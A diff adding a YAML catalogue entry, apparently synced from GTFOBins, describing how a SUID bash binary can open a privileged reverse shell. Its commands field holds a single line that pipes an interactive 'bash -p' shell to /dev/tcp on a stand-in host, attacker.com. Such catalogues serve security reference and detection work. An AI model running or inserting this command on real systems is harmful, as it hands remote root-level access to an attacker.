@@ -1,0 +1,25 @@
+id: gtfobins/bash/reverse-shell/suid
+type: binary
+platform: linux
+name: bash
+phases:
+- execution
+- command-and-control
+- privilege-escalation
+capabilities:
+- reverse-shell
+privilege_required: suid
+sources:
+- project: GTFOBins
+  upstream_url: https://gtfobins.github.io
+  license: MIT (verify upstream LICENSE)
+  upstream_version: acd5246
+  last_synced: '2026-08-25'
+commands:
+- template: bash -p -c 'exec bash -p -i &>/dev/tcp/attacker.com/12345 <&1'
+references:
+- https://gtfobins.github.io/gtfobins/bash/
+tags:
+- linux
+- unix
+- gtfobins
